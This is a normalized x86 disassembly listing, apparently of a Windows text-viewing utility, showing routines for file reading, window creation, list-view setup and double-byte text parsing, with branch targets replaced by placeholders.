cmp esi 0xffffffff
je r-xdata
movsx edx [ rw-data ]
push 0x8
push edx
call sub_429969
xor ebx ebx
add esp 0x8
cmp eax ebx
mov [ ebp + 0x4c ] eax
je r-xdata
push 0x0
push esi
call ebx
push 0x0
push 0x0
push 0x0
push esi
mov edi eax
call [ SetFilePointer@IAT ]
movsx eax [ rw-data ]
shl eax 0x3
cmp edi eax
jbe r-xdata
mov edi 0x1
jmp r-xdata
cmp edi ebx
je r-xdata
mov edi eax
push esi
call [ CloseHandle@IAT ]
cmp edi ebx
jne r-xdata
mov edi [ esp + 0x10 ]
push ebx
lea ecx [ esp + 0x18 ]
push ecx
push edi
push eax
push esi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push 0x1
push ebx
push r--data
mov ecx rw-data
mov [ ebp + 0x5a ] 0x0
call sub_425ab0
push eax
call sub_420db0
mov [ ebp + 0x50 ] eax
mov eax [ esp + 0x20 ]
add esp 0x4
cmp eax ebx
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push eax
mov [ eax ] 0x3
mov [ eax + 0x4 ] sub_402b30
mov [ eax + 0x1c ] 0x10
mov [ eax + 0x24 ] r--data
call [ RegisterClassA@IAT ]
test ax ax
je r-xdata
mov cl [ rw-data ]
test cl cl
mov eax 0x50800000
je r-xdata
pop edi
pop esi
mov [ ebp + 0xc ] bx
mov [ ebp + 0x8 ] ebx
pop ebx
xor eax eax
pop ebp
add esp 0x8
retn 0x4
mov edx [ rw-data ]
mov ecx [ rw-data ]
push ebx
push edx
push 0x3
push ecx
push ebx
push ebx
push ebx
push ebx
push eax
push ebx
push r--data
push ebx
call [ CreateWindowExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
mov eax 0x50900000
push 0x5
push eax
call [ ShowWindow@IAT ]
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
add esp 0x8
retn 0x4
sub_4037c0
sub esp 0x220
push ebx
push esi
push edi
mov edi [ esp + 0x230 ]
push edi
mov esi ecx
call sub_403520
test eax eax
mov ebx [ esp + 0x234 ]
jl r-xdata
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x44 ]
mov edx [ ecx + eax * 8 + 0x4 ]
mov eax [ esi + 0x40 ]
push 0x0
push 0x0
push edx
push eax
call [ SetFilePointer@IAT ]
mov ecx [ esi + 0x40 ]
push ecx
push 0x200
lea edx [ esp + 0x34 ]
push edx
lea ecx [ esp + 0x18 ]
call sub_4010b0
push 0x1
lea eax [ esp + 0x10 ]
push eax
push ebx
push edi
mov ecx esi
call sub_4028e0
pop edi
pop esi
pop ebx
add esp 0x220
retn 0x8
push eax
lea ecx [ esp + 0x10 ]
call sub_401100
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push edi
mov ecx esi
call sub_4028e0
sub_403850
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_419fd0
movsx ecx [ esi + 0x1e ]
push ecx
mov ecx esi
call sub_419930
movsx edx [ esi + 0x1e ]
push eax
mov eax [ esi + 0x14 ]
lea ecx [ eax + edx * 2 ]
push ecx
mov ecx [ esi + 0x4 ]
call sub_402a50
mov al [ esi + 0x54 ]
test al al
je r-xdata
pop esi
retn 0x4
push edi
mov di [ esi + 0x1e ]
mov ecx esi
call sub_419fc0
movsx edx di
cmp edx eax
je r-xdata
pop edi
mov ecx esi
call sub_402800
test eax eax
je r-xdata
test di di
je r-xdata
cmp [ eax + 0x6 ] di
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x5a ] 0x1
movsx ecx [ rw-data ]
lea edx [ ecx * 8 - 0x8 ]
push edx
lea ecx [ eax + 0x8 ]
push ecx
push eax
call sub_429090
movsx edx [ rw-data ]
mov cl [ esi + 0x54 ]
mov eax [ esi + 0x4c ]
mov [ eax + edx * 8 - 0x8 ] cl
movsx edx [ rw-data ]
mov cl [ esi + 0x55 ]
mov eax [ esi + 0x4c ]
mov [ eax + edx * 8 - 0x7 ] cl
movsx edx [ rw-data ]
mov cl [ esi + 0x56 ]
mov eax [ esi + 0x4c ]
mov [ eax + edx * 8 - 0x6 ] cl
movsx edx [ rw-data ]
mov cl [ esi + 0x57 ]
mov eax [ esi + 0x4c ]
mov [ eax + edx * 8 - 0x5 ] cl
movsx edx [ rw-data ]
mov cl [ esi + 0x58 ]
mov eax [ esi + 0x4c ]
mov [ eax + edx * 8 - 0x4 ] cl
movsx edx [ rw-data ]
mov eax [ esi + 0x4c ]
mov cl [ esi + 0x59 ]
mov [ eax + edx * 8 - 0x3 ] cl
movsx edx [ rw-data ]
mov eax [ esi + 0x4c ]
mov cx [ esi + 0x1e ]
add esp 0xc
mov [ eax + edx * 8 - 0x2 ] cx
mov [ eax + 0x6 ] di
pop edi
mov [ esi + 0x5a ] 0x1
pop esi
retn 0x4
sub_4039b0
mov eax [ esp + 0x8 ]
cmp eax 0x110
push esi
push edi
mov edi ecx
ja r-xdata
cmp eax 0x233
ja r-xdata
je r-xdata
cmp eax 0x40d
jne r-xdata
je r-xdata
mov esi [ esp + 0xc ]
push 0x0
push 0x0
push 0x1
push rw-data
push 0x7d0
push esi
mov ecx rw-data
call sub_4206e0
push 0x0
push esi
mov [ edi + 0x3c ] esi
call sub_4258a0
push 0x664
call sub_42991a
add esp 0xc
test eax eax
je r-xdata
add eax 0xfffffffe
cmp eax 0x51
ja r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx [ rw-data ]
cmp [ ecx + 0x21e ] 0x0
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ rw-data ]
push eax
call sub_40aa60
pop edi
xor eax eax
pop esi
retn 0x10
cmp eax 0x111
je r-xdata
pop edi
mov [ rw-data ] 0x0
xor eax eax
pop esi
retn 0x10
mov [ eax ] r--data
mov edx [ edi + 0x50 ]
push 0x8f
push edx
push esi
mov ecx eax
mov [ rw-data ] eax
call sub_40d910
pop edi
mov eax 0x1
pop esi
retn 0x10
movzx eax [ eax + lookup_table_403c30 ]
jmp [ eax * 4 + jump_table_403c1c ]
mov eax [ esp + 0xc ]
push 0x23
push 0x92
push 0x91
push eax
call sub_420e20
add esp 0x10
sub eax 0x2
je r-xdata
mov edx [ esp + 0x18 ]
pop edi
mov [ edx ] 0x1
xor eax eax
pop esi
retn 0x10
mov ecx [ esp + 0x14 ]
movzx eax cx
cmp eax 0x6cc
jg r-xdata
cmp eax 0x214
jne r-xdata
mov ecx [ esp + 0xc ]
push ecx
call sub_4258e0
mov edx [ rw-data ]
push edx
call j_sub_429931
add esp 0x8
mov [ edi + 0x3c ] 0x0
pop edi
mov eax 0x1
pop esi
retn 0x10
mov eax [ esp + 0x14 ]
push eax
mov ecx rw-data
call sub_420810
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx rw-data
call sub_4207d0
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx [ esp + 0xc ]
push 0x407
push ecx
call sub_414bc0
add esp 0x8
pop edi
mov eax 0x1
pop esi
retn 0x10
mov eax [ esp + 0x18 ]
mov [ eax ] 0x0
sub eax 0x4
je r-xdata
cmp eax 0x7d0
jl r-xdata
je r-xdata
mov eax [ esp + 0x18 ]
push eax
mov ecx rw-data
call sub_4209c0
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx edi
call sub_403480
mov edx [ esp + 0x18 ]
neg eax
sbb eax eax
inc eax
pop edi
mov [ edx ] eax
xor eax eax
pop esi
retn 0x10
dec eax
jne r-xdata
cmp eax 0x7d9
jg r-xdata
mov edx [ rw-data ]
mov ecx [ edx + 0xc ]
push sub_402400
call sub_40b340
pop edi
xor eax eax
pop esi
retn 0x10
dec eax
je r-xdata
mov ecx [ esp + 0x18 ]
pop edi
mov [ ecx ] 0x1
xor eax eax
pop esi
retn 0x10
push ecx
mov ecx [ rw-data ]
call sub_40d580
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx edi
call sub_403480
test eax eax
jne r-xdata
dec eax
je r-xdata
mov ecx [ esp + 0xc ]
push ecx
call [ DestroyWindow@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
pop edi
xor eax eax
pop esi
retn 0x10
sub_403c90
sub esp 0x14
push ebp
push esi
mov esi ecx
call sub_402620
mov ebp [ esp + 0x24 ]
cmp ebp 0x14
jl r-xdata
push ebx
mov ebx [ esp + 0x24 ]
xor edx edx
test ebp ebp
push edi
jle r-xdata
pop esi
xor eax eax
pop ebp
add esp 0x14
retn 0x8
mov ecx 0x6
sub ecx edx
mov [ esp + 0x2c ] ecx
mov ebx ecx
shr ecx 0x2
xor eax eax
lea edi [ esp + edx + 0x10 ]
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov eax ebx
mov ebx [ esp + 0x28 ]
add edx eax
jmp r-xdata
mov cl [ esp + 0x10 ]
mov dl [ esp + 0x11 ]
mov al [ esp + 0x12 ]
mov [ esi + 0x54 ] cl
mov cl [ esp + 0x13 ]
mov [ esi + 0x55 ] dl
mov dl [ esp + 0x14 ]
mov [ esi + 0x56 ] al
mov al [ esp + 0x15 ]
mov [ esi + 0x57 ] cl
mov [ esi + 0x58 ] dl
mov [ esi + 0x59 ] al
mov [ esi + 0x54 ] 0x0
jmp r-xdata
mov al [ ebx + edx * 2 ]
or al 0x80
mov [ esp + edx + 0x10 ] al
inc edx
cmp edx ebp
jl r-xdata
mov cx [ esi + 0x1a ]
xor eax eax
test cx cx
je r-xdata
movzx edx [ ebx + ebp * 2 - 0x2 ]
push edx
lea eax [ esp + 0x14 ]
push eax
mov ecx esi
mov [ esp + ebp + 0x17 ] 0x0
call sub_4037c0
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
mov ecx esi
call sub_4037c0
cmp ebp 0x1
jle r-xdata
cmp edx 0x6
jge r-xdata
pop edi
pop ebx
pop esi
pop ebp
add esp 0x14
retn 0x8
jle r-xdata
cmp ebp 0x6
mov [ esp + edx + 0x10 ] 0x0
jle r-xdata
push 0x2f
mov ecx esi
call sub_419a00
xor edi edi
test ebp ebp
jle r-xdata
nop
mov ecx esi
call sub_402710
mov ecx esi
call sub_402800
xor ebx ebx
cmp eax ebx
je r-xdata
movzx eax [ ebx + edi * 2 ]
push eax
mov ecx esi
call sub_419a00
inc edi
cmp edi ebp
jl r-xdata
mov ecx [ esi + 0x14 ]
and [ ecx + eax * 2 ] 0x7f7f
movsx edx [ esi + 0x1a ]
lea ecx [ ecx + eax * 2 ]
inc eax
cmp eax edx
jl r-xdata
mov [ esi + 0x1e ] bx
mov di [ eax + 0x6 ]
mov ecx esi
call sub_419fc0
movsx ecx di
cmp ecx eax
jg r-xdata
cmp di bx
mov [ esi + 0x1e ] di
je r-xdata
movsx eax [ esi + 0x1a ]
mov eax [ esi + 0x14 ]
movsx edx di
cmp [ eax + edx * 2 - 0x2 ] 0x2f
je r-xdata
sub_403e00
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
push eax
push ecx
mov ecx esi
call sub_403c90
test eax eax
jne r-xdata
movsx eax [ esi + 0x1e ]
mov edx [ esi ]
push eax
mov ecx esi
call [ edx ]
mov ecx esi
call sub_419a30
pop esi
retn 0x8
push 0x40
call [ MessageBeep@IAT ]
pop esi
retn 0x8
sub_403e40
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
push eax
push ecx
mov ecx esi
call sub_403c90
mov cl [ esi + 0x5b ]
test cl cl
je r-xdata
test eax eax
jne r-xdata
mov ecx esi
call sub_402620
mov eax 0x1
pop esi
retn 0x8
movsx eax [ esi + 0x1e ]
mov edx [ esi ]
push eax
mov ecx esi
call [ edx ]
mov eax 0x1
pop esi
retn 0x8
pop esi
retn 0x8
sub_403e90
push ecx
mov eax [ rw-data ]
push ebx
push esi
mov esi ecx
cmp eax esi
push edi
mov edi [ esp + 0x14 ]
je r-xdata
mov [ rw-data ] esi
cmp [ esi + 0x44 ] 0x3
jne r-xdata
cmp edi 0x2
je r-xdata
cmp edi 0x2
je r-xdata
push edi
mov ecx rw-data
call sub_402640
mov ecx rw-data
call sub_402620
mov ecx rw-data
call sub_417d00
mov al [ esi + 0x44 ]
test al al
je r-xdata
mov ecx rw-data
call sub_417d00
pop edi
pop esi
pop ebx
add esp 0x4
mov [ esp + 0x4 ] 0x40
jmp [ MessageBeep@IAT ]
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x30 ]
cmp ecx edx
lea eax [ esi + 0x30 ]
mov [ esp + 0xc ] eax
jne r-xdata
push ebp
mov ecx esi
call sub_40ea20
movsx edx [ esi + 0x24 ]
movsx ecx [ esi + 0x38 ]
mov eax edx
xor ebp ebp
cmp eax ecx
jge r-xdata
mov eax [ esi + 0x1c ]
sub ecx edx
mov edi ecx
mov ecx [ eax + 0x10 ]
lea ebx [ ecx + edx * 2 ]
mov ecx esi
call sub_40db40
mov eax [ esp + 0x18 ]
test ebp ebp
pop ebp
je r-xdata
mov edi [ esi + 0x1c ]
cmp eax 0x2
jne r-xdata
cmp eax 0x2
je r-xdata
mov ebx [ edi + 0x10 ]
movzx ebx [ ebx + eax * 2 ]
and ebx 0x7f00
cmp ebx 0x2400
je r-xdata
push edi
push ebx
mov ecx rw-data
call sub_403e00
pop edi
pop esi
pop ebx
pop ecx
retn 0x4
push edi
push ebx
mov ecx rw-data
call sub_403e40
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x4
mov [ esp + 0x4 ] 0x40
jmp [ MessageBeep@IAT ]
inc eax
cmp eax ecx
jl r-xdata
mov ebp 0x1
pop edi
pop esi
pop ebx
pop ecx
retn 0x4
jmp r-xdata
cmp eax [ edi + 0x18 ]
jge r-xdata
mov ecx [ esp + 0xc ]
push 0xffffffff
call sub_40e930
dec edi
mov ecx rw-data
je r-xdata
call sub_402620
pop edi
pop esi
pop ebx
pop ecx
retn 0x4
push edi
push ebx
call sub_403c90
test eax eax
je r-xdata
sub_404000
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
xor edi edi
test ebx ebx
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn
mov esi eax
nop
movzx eax al
push eax
call sub_429b24
add esp 0x4
mov ecx eax
movzx ax al
cmp ax 0xa5
jne r-xdata
movzx eax [ ebp + edi * 2 ]
pop edi
movzx ecx cx
pop esi
sub eax ecx
pop ebp
retn
inc edi
inc esi
cmp edi ebx
jl r-xdata
xor ecx ecx
mov ch al
inc esi
mov cl [ esi ]
and ecx 0x7f7f
jmp r-xdata
mov eax 0xa4
mov al [ esi ]
test al al
jns r-xdata
cmp cx [ ebp + edi * 2 ]
jne r-xdata
sub_404070
push ebx
mov ebx [ esp + 0x10 ]
test ebx ebx
jne r-xdata
push ebp
mov ebp [ esp + 0x10 ]
movzx eax [ ebp ]
add eax 0xffffffd6
cmp eax 0x33
push esi
push edi
ja r-xdata
xor eax eax
pop ebx
retn
mov edi [ esp + 0x14 ]
movzx ecx [ edi ]
test cl cl
jns r-xdata
movzx eax [ eax + lookup_table_4041cc ]
jmp [ eax * 4 + jump_table_4041b8 ]
push ecx
call sub_429b24
add esp 0x4
mov esi 0x1
movzx eax [ edi + 0x1 ]
shl ecx 0x8
or eax ecx
and eax 0x7f7f
mov esi 0x2
jmp r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov edi [ esp + 0x14 ]
mov al [ edi ]
cmp al 0x5d
je r-xdata
mov edi [ esp + 0x14 ]
mov al [ edi ]
xor esi esi
cmp al 0x5d
je r-xdata
mov edi [ esp + 0x14 ]
mov al [ edi ]
cmp al 0x5d
je r-xdata
dec ebx
push ebx
add ebp 0x2
lea edx [ esi + edi ]
push ebp
push edx
call sub_404070
add esp 0xc
cmp eax 0xffffffff
je r-xdata
movzx ecx [ ebp ]
cmp eax ecx
jne r-xdata
xor esi esi
jmp r-xdata
cmp al 0x20
je r-xdata
dec ebx
add ebp 0x2
lea esp [ esp ]
lea esp [ esp ]
cmp al 0x20
je r-xdata
pop edi
add eax esi
pop esi
pop ebp
pop ebx
retn
cmp al 0x2f
je r-xdata
mov al [ esi + edi - 0x1 ]
dec esi
test al al
jns r-xdata
test esi esi
jl r-xdata
cmp al 0x2f
je r-xdata
cmp al 0x2f
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xffffffff
pop ebx
retn
test esi esi
jge r-xdata
dec esi
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov al [ esi + edi + 0x1 ]
inc esi
cmp al 0x5d
jne r-xdata
test al 0x80
mov edx 0x0
setne dl
inc edx
mov esi edx
jmp r-xdata
push ebx
lea ecx [ esi + edi ]
push ebp
push ecx
call sub_404070
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
cmp al 0x20
je r-xdata
sub_404200
push ebp
mov ebp [ esp + 0x10 ]
test ebp ebp
jne r-xdata
push ebx
mov ebx [ esp + 0x10 ]
movzx eax [ ebx + ebp * 2 - 0x2 ]
dec ebp
add eax 0xffffffd6
cmp eax 0x33
push esi
push edi
ja r-xdata
xor eax eax
pop ebp
retn
mov esi [ esp + 0x14 ]
movzx eax [ esi ]
test al al
jns r-xdata
movzx eax [ eax + lookup_table_40436c ]
jmp [ eax * 4 + jump_table_404358 ]
push eax
call sub_429b24
add esp 0x4
mov edi 0x1
xor ecx ecx
mov ch [ esi - 0x1 ]
mov edi 0x2
or ecx eax
and ecx 0x7f7f
mov eax ecx
jmp r-xdata
pop edi
pop esi
pop ebx
or eax 0xffffffff
pop ebp
retn
mov esi [ esp + 0x14 ]
mov al [ esi ]
cmp al 0x5b
je r-xdata
mov ebx [ esp + 0x14 ]
mov al [ ebx ]
xor edi edi
cmp al 0x5b
je r-xdata
mov esi [ esp + 0x14 ]
mov al [ esi ]
cmp al 0x5b
je r-xdata
push ebp
push ebx
sub esi edi
push esi
call sub_404200
add esp 0xc
cmp eax 0xffffffff
je r-xdata
movzx edx [ ebx + ebp * 2 ]
cmp eax edx
jne r-xdata
xor edi edi
jmp r-xdata
cmp al 0x20
je r-xdata
mov esi ebx
sub esi edi
mov ecx ebx
jmp r-xdata
cmp al 0x20
je r-xdata
add eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
cmp al 0x2f
je r-xdata
mov al [ edi + ebx - 0x1 ]
dec edi
inc esi
test al al
jns r-xdata
cmp al 0x20
je r-xdata
cmp al 0x2f
je r-xdata
cmp al 0xa
je r-xdata
test edi edi
jge r-xdata
dec edi
inc esi
test edi edi
jl r-xdata
cmp al 0x2f
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov ecx [ esp + 0x18 ]
push ebp
push ecx
push esi
call sub_404200
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
or eax 0xffffffff
pop ebp
retn
cmp al 0xa
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xd
je r-xdata
test al 0x80
mov edx 0x0
setne dl
inc edx
mov edi edx
jmp r-xdata
mov al [ ecx - 0x1 ]
inc edi
dec ecx
cmp al 0x5b
jne r-xdata
sub_4043a0
push ebx
push ebp
push edi
mov ecx esi
mov edi eax
mov ebx 0x1
call sub_40bad0
xor ebp ebp
push 0xffffffff
mov ecx esi
call sub_40b700
mov al [ edi + 0x2 ]
add edi 0x2
cmp al 0xa
je r-xdata
mov cl [ edi + 0x1 ]
cmp cl 0xa
je r-xdata
inc edi
cmp al 0xd
jne r-xdata
cmp cl 0xd
je r-xdata
mov eax edi
pop edi
pop ebp
pop ebx
retn
test al al
jns r-xdata
test ebx ebx
je r-xdata
cmp [ esp + 0x14 ] 0x1
je r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
jne r-xdata
movzx eax al
lea ecx [ eax - 0x20 ]
cmp ecx 0x3d
ja r-xdata
movzx ecx [ edi + 0x1 ]
movzx eax al
inc edi
shl eax 0x8
or eax ecx
push eax
jmp r-xdata
test ebx ebx
je r-xdata
movzx edx al
push edx
cmp al 0x2f
jne r-xdata
push eax
jmp r-xdata
movzx edx [ ecx + lookup_table_4044c0 ]
jmp [ edx * 4 + jump_table_4044ac ]
mov ecx esi
call sub_40b760
mov al [ edi ]
test al al
je r-xdata
push 0x2c
mov ecx esi
call sub_40b760
push 0x20
jmp r-xdata
mov al [ rw-data ]
neg al
sbb eax eax
and eax 0xffffdf01
add eax 0x215a
mov cl [ rw-data ]
neg cl
sbb ecx ecx
and ecx 0xffffdf02
add ecx 0x215b
push ecx
jmp r-xdata
push 0x9
jmp r-xdata
mov al [ rw-data ]
xor ebx ebx
test al al
jne r-xdata
inc edi
inc ebp
cmp ebp 0x200
jl r-xdata
push 0xffffffff
mov ecx esi
call sub_40b700
jmp r-xdata
sub_404500
push esi
mov esi ecx
test esi esi
jne r-xdata
push eax
push esi
call [ lstrcpyA@IAT ]
mov esi eax
jmp r-xdata
cmp [ eax + esi ] 0x2e
jne r-xdata
nop
push esi
call [ lstrlenA@IAT ]
dec eax
test eax eax
jle r-xdata
push r--data
push esi
call [ lstrcatA@IAT ]
mov eax esi
pop esi
retn
mov [ eax + esi ] 0x0
cmp cl 0x2e
je r-xdata
dec eax
test eax eax
jg r-xdata
mov cl [ eax + esi ]
cmp cl 0x5c
je r-xdata
sub_404550
push ecx
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebx
push esi
push 0x0
push edi
call [ GetFileSize@IAT ]
mov ebx eax
lea ecx [ ebx + 0x5 ]
push ecx
push 0x1
call sub_429969
mov esi eax
add esp 0x8
test esi esi
je r-xdata
xor eax eax
pop edi
pop ecx
retn
push edi
call [ CloseHandle@IAT ]
mov eax esi
pop esi
pop ebx
pop edi
pop ecx
retn
push 0x0
lea edx [ esp + 0x10 ]
push edx
push ebx
lea eax [ esi + 0x1 ]
push eax
push edi
mov [ esi ] 0xa
call [ ReadFile@IAT ]
sub_4045c0
push esi
xor esi esi
mov si [ ecx ]
test si si
mov eax ecx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov edx esi
nop
test si si
mov eax ecx
je r-xdata
add eax 0x2
xor edx edx
mov dx [ eax ]
test dx dx
mov ecx eax
je r-xdata
cmp dx 0x215a
je r-xdata
mov edx [ esp + 0x8 ]
mov [ edx ] ecx
pop esi
retn
mov edx esi
cmp dx 0x5d
je r-xdata
mov dx [ eax + 0x2 ]
add eax 0x2
test dx dx
jne r-xdata
mov dx [ ecx + 0x2 ]
add ecx 0x2
test dx dx
jne r-xdata
cmp dx 0x215b
je r-xdata
cmp dx 0x5b
je r-xdata
cmp dx 0x9
je r-xdata
mov dx [ ecx + 0x2 ]
add ecx 0x2
test dx dx
jne r-xdata
mov edx [ esp + 0x8 ]
mov [ edx ] ecx
pop esi
retn
sub_404650
push esi
push edi
mov edi eax
mov eax edx
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov esi eax
push esi
push edx
inc edi
push edi
call sub_429c00
add esp 0xc
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn
mov al [ esi + edi ]
cmp al 0x2c
je r-xdata
pop edi
lea eax [ esi + 0x1 ]
pop esi
retn
cmp al 0x29
je r-xdata
sub_4046c0
mov eax [ esp + 0x4 ]
push ebp
push esi
xor esi esi
test edi edi
mov ebp eax
jle r-xdata
mov edx [ esp + 0x10 ]
sub eax ebp
pop esi
mov [ edx ] eax
xor eax eax
pop ebp
retn
mov edi edi
mov edx ecx
and edx 0xff00
cmp edx 0x2500
jne r-xdata
movzx ecx cx
push ecx
call sub_429b24
add esp 0x4
mov ecx eax
jmp r-xdata
cmp cx [ ebx + esi * 2 ]
jne r-xdata
and ecx 0xff
or ecx 0x2400
movzx eax [ ebx + esi * 2 ]
movzx ecx cx
pop esi
sub eax ecx
pop ebp
retn
inc esi
cmp esi edi
jl r-xdata
lea eax [ esp + 0xc ]
push eax
call sub_418b70
mov ecx eax
add esp 0x4
cmp cx 0x80
jae r-xdata
mov eax [ esp + 0xc ]
sub_404740
mov ecx eax
and ecx 0x80
test cl cl
jne r-xdata
mov edx eax
and edx 0xe0
cmp dl 0xc0
jne r-xdata
mov eax 0x1
retn
mov ecx eax
and ecx 0xf0
cmp cl 0xe0
jne r-xdata
mov eax 0x2
retn
and al 0xf8
sub al 0xf0
neg al
sbb eax eax
and eax 0xfffffffd
add eax 0x4
retn
mov eax 0x3
retn
sub_404790
sub esp 0x50
push ebx
mov ebx [ esp + 0x58 ]
push ebp
mov ebp [ SendMessageA@IAT ]
push esi
push edi
mov esi ecx
xor eax eax
mov ecx 0xa
lea edi [ esp + 0x10 ]
[ edi ]
mov edi [ esp + 0x68 ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
mov [ esp + 0x20 ] eax
mov eax [ esi + 0x18 ]
push 0x1007
push ebx
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x24 ] edi
mov [ esp + 0x34 ] eax
call ebp
movzx eax [ esi + 0x20 ]
dec eax
je r-xdata
mov eax 0x103
dec eax
je r-xdata
mov eax 0x109
dec eax
je r-xdata
mov eax 0x104
jmp r-xdata
dec eax
je r-xdata
mov eax 0x108
dec eax
je r-xdata
mov eax 0x10a
jmp r-xdata
dec eax
je r-xdata
push eax
mov [ esp + 0x44 ] 0x1
call sub_420ca0
add esp 0x4
lea edx [ esp + 0x38 ]
push edx
push edi
push 0x102e
push ebx
mov [ esp + 0x5c ] eax
call ebp
movzx eax [ esi + 0x22 ]
sub eax 0x0
je r-xdata
mov eax 0x105
jmp r-xdata
mov eax 0x106
jmp r-xdata
mov al [ esi + 0x25 ]
neg al
sbb eax eax
add eax 0x117
mov eax 0x115
jmp r-xdata
mov eax 0x10c
jmp r-xdata
dec eax
je r-xdata
push eax
mov [ esp + 0x44 ] 0x3
call sub_420ca0
add esp 0x4
mov [ esp + 0x4c ] eax
lea eax [ esp + 0x38 ]
push eax
push edi
push 0x102e
push ebx
call ebp
movzx eax [ esi + 0x23 ]
sub eax 0x0
je r-xdata
mov eax 0x10b
jmp r-xdata
mov eax 0x106
jmp r-xdata
push eax
mov [ esp + 0x44 ] 0x2
call sub_420ca0
add esp 0x4
lea edx [ esp + 0x38 ]
push edx
push edi
push 0x102e
push ebx
mov [ esp + 0x5c ] eax
call ebp
mov al [ esi + 0x26 ]
neg al
mov [ esp + 0x40 ] 0x5
sbb eax eax
add eax 0x108
push eax
call sub_420ca0
add esp 0x4
lea ecx [ esp + 0x38 ]
push ecx
push edi
push 0x102e
push ebx
mov [ esp + 0x5c ] eax
call ebp
mov dl [ esi + 0x27 ]
neg dl
mov [ esp + 0x40 ] 0x6
sbb edx edx
add edx 0x108
push edx
call sub_420ca0
add esp 0x4
mov [ esp + 0x4c ] eax
lea eax [ esp + 0x38 ]
push eax
push edi
push 0x102e
push ebx
call ebp
mov ecx [ esi + 0x1c ]
lea edx [ esp + 0x38 ]
push edx
push edi
push 0x102e
push ebx
mov [ esp + 0x50 ] 0x7
mov [ esp + 0x5c ] ecx
call ebp
mov al [ esi + 0x24 ]
neg al
lea ecx [ esp + 0x38 ]
push ecx
push edi
push 0x102b
push ebx
mov [ esp + 0x58 ] 0xf000
sbb eax eax
and eax 0x1000
add eax 0x1000
mov [ esp + 0x54 ] eax
call ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn 0x8
push eax
mov [ esp + 0x44 ] 0x4
call sub_420ca0
add esp 0x4
lea ecx [ esp + 0x38 ]
push ecx
push edi
push 0x102e
push ebx
mov [ esp + 0x5c ] eax
call ebp
mov al [ esi + 0x21 ]
test al al
je r-xdata
mov eax 0x10d
jmp r-xdata
mov eax 0x106
jmp r-xdata
sub_4049b0
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
test eax eax
push edi
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax 0xffffffff
mov edi [ CloseHandle@IAT ]
je r-xdata
push eax
call sub_429931
add esp 0x4
mov eax [ esi + 0xc ]
cmp eax 0xffffffff
je r-xdata
push eax
call edi
pop edi
mov [ esi + 0xc ] 0xffffffff
mov [ esi + 0x8 ] 0xffffffff
mov [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call edi
sub_404a00
push ecx
mov eax [ esp + 0x8 ]
push ebp
mov ebp [ SetFilePointer@IAT ]
push esi
push edi
push 0x0
mov esi ecx
mov edx [ esi + 0xc ]
push 0x0
lea ecx [ eax * 4 + 0x4 ]
push ecx
push edx
call ebp
mov edx [ esi + 0xc ]
mov edi [ ReadFile@IAT ]
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x4
lea ecx [ esp + 0x20 ]
push ecx
push edx
call edi
mov eax [ esp + 0x14 ]
add eax 0xfffffe00
test eax eax
jge r-xdata
mov ecx [ esi + 0x8 ]
push 0x0
push 0x0
push eax
push ecx
call ebp
mov eax [ esp + 0x18 ]
mov ecx [ esi + 0x8 ]
push 0x0
lea edx [ esp + 0x10 ]
push edx
push 0x400
push eax
push ecx
call edi
pop edi
pop esi
pop ebp
pop ecx
retn 0x8
push ebx
mov ebx [ esp + 0x1c ]
push 0x0
mov eax 0xa0a0a0a
push 0x0
mov ecx 0x80
mov edi ebx
[ edi ]
mov eax [ esi + 0x8 ]
push 0x0
push eax
call ebp
mov eax [ esp + 0x18 ]
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ eax + 0x200 ]
sub ebx eax
mov eax [ esi + 0x8 ]
push edx
add ebx 0x200
push ebx
push eax
call [ ReadFile@IAT ]
pop ebx
pop edi
pop esi
pop ebp
pop ecx
retn 0x8
sub_404ae0
push ebx
or eax 0xffffffff
push esi
mov esi ecx
